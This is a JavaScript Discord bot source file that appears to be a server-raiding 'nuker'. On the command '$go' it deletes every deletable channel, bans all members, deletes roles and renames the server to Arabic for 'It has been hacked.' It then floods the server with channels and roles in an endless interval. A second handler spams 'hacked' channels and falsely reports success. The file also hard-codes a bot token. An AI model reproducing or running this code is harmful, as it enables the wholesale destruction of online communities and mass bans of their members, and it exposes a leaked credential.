const Discord = require("discord.js");
const client = new Discord.Client();

client.on('message', message =>{
    if (message.content.startsWith('$go')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('تم التهكير.')
                setInterval(function(){
                    message.guild.createChannel('تم التهكير.', 'voice')
                    message.guild.createChannel('تم التهكير. ', 'text')
                    message.guild.createRole({name : 'تم التهكير. '})
                })
            }
        }
});

client.on('message', message => {
    if (message.content === "$go") {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);

		
		
		
		
     message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
	 message.guild.createChannel('تم التهكير.', 'text')
     message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')
	 message.guild.createChannel('تم التهكير.', 'voice')

    
message.channel.sendMessage('**Text Channel Was Succsesfluy Created**')
}
});
 
client.login("Njg2ODQ3NTI4NTk0ODMzNDUz.XnXCrg.uKdJigy_dmrRImYYNJle6ybAxvk"):
